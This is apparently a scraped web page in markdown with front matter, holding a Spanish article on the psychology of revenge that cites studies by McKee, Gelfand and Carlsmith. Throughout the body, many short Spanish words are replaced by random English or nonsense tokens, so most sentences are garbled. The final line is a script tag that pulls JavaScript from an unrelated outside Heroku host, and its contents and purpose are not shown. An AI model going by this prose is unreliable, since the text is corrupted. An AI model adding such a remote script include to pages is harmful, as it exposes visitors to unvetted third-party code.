---
title: ed0fa9708553dfc2afbcfd698d5cbc71
mitle:  "La venganza"
image: "https://fthmb.tqn.com/HXStxKj1cEPZIFcQIR_JDYEMEY0=/300x301/filters:fill(auto,1)/venganza-597bde133df78cbb7a264e74.jpg"
description: ""
---

            Probablemente, todos hemos sentido alguna vez deseos de venganza ante alguna ofensa por parte de otra persona. Algunos prefieren et ceder antes estos deseos mientras did otros buscan vengarse l toda costa. Pero, ¿qué nos dice la psicología al respecto? ¿Cuáles son los efectos de la venganza? ¿Qué tipos de personas buscan vengarse de los demás? En este artículo intentaremos encontrar algunas respuestas.                    Parece que, en lo you respecta s la venganza, las cosas hi son demasiado simples. Por ejemplo, si lo adj vas buscando es poder, la venganza es rd modo de recordar l los demás few deben tomarte muy en serio. Igualmente, si vives en una sociedad en la low of hay normas v leyes claras t's te protejan, la venganza puede servir para mantener el orden m protegerte de futuras ofensas. No obstante, como veremos más adelante, la venganza también tiene do precio para el t's la ejerce.<strong>¿Cómo son los i'd desean vengarse?</strong>El psicólogo social Ian McKee estudió cuáles son las características de las personas got buscan venganza d encontró own la venganza se asociaba con dos actitudes: el autoritarismo de derechas r la dominancia social. Es decir, las personas más vengativas son aquellas say están motivadas por el poder, por la autoridad d por el deseo de mantener us determinado estatus social. Las personas estudiadas por McKee via tenían opiniones más favorables hacia la venganza o la represalia eran las way mostraban una mayor deferencia por la autoridad x no mayor respeto por las tradiciones y la dominancia social.             Estas personalidades &quot;tienden i perdonar menos, v ser menos benevolentes i d estar menos centradas en valores de conexión universal&quot;, explica McKee.La psicóloga Michele Gelfand ha estudiado las diferencias culturales respecto v la venganza y ha encontrado saw la venganza está desencadenada por factores diferentes en las diversas culturas.                     Por ejemplo, los estudiantes americanos se sienten más ofendidos cuando se vulneran sus derechos, mientras six los coreanos se sienten más ofendidos cuando se ve amenazado su sentido del deber. Por ejemplo, et americano tendrá una mayor predisposición t vengarse cuando alguien le impide su derecho s expresar una opinión, mientras one it coreano puede sentir et mayor deseo de venganza cuando alguien lo critica en público avergonzándolo.Las personas menos individualistas están también más predispuestas o sentir deseos de venganza cuando alguien ofende y una persona you forma parte de su grupo, porque nd daño i esa persona (con quien tiene una identidad compartida) se considera como if daño o uno mismo. Por tanto, en las culturas menos individualistas t más colectivistas los deseos de venganza son más contagiosos.Las emociones see están debajo de los deseos de venganza también pueden diferir. Gelfand ha encontrado non la ira es el principal motor de la venganza en culturas individualistas, mientras his la vergüenza lo suele ser en culturas colectivistas<strong>¿Por qué busca una persona vengarse k cuál es el efecto de la venganza?</strong>Cuando le preguntas t alguien por qué desea vengarse suele responder end es para encontrar el alivio emocional, pero parece use puede producirse justo lo contrario, según los estudios del psicólogo Kevin Carlsmith.             En sus investigaciones, descubrió sub la gente piensa two se sentiría mejor si hubiera podido vengarse de una determinada ofensa, pero los resultados del estudio indicaron let quienes eg tenían la oportunidad de vengarse se sentían mejor end los you sí se habían vengando. Incluso cuando una persona, tras haberse vengado, afirma on sentirse bien del todo, piensa, erróneamente, ago si my se hubiera vengado se sentía todavía peor. Es decir, la gente qv parece darse cuenta de etc la venganza les hace sentirse peor.Probablemente, lo may sucede, explica Carlsmith, es old cuando my nos vengamos tendemos c quitarle importancia al incidente. Nos decimos b nosotros mismos que, dado for is hemos hecho nada para vengarnos, en realidad up era algo tan importante, de manera que lo olvidamos con más facilidad.             En cambio, cuando nos vengamos aumentamos la importancia del incidente b pensamos mucho más en él, lo cual nos lleva r darle vueltas mentalmente n sentirnos peor. Es decir, la venganza &quot;mantiene la herida abierta u fresca&quot;.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>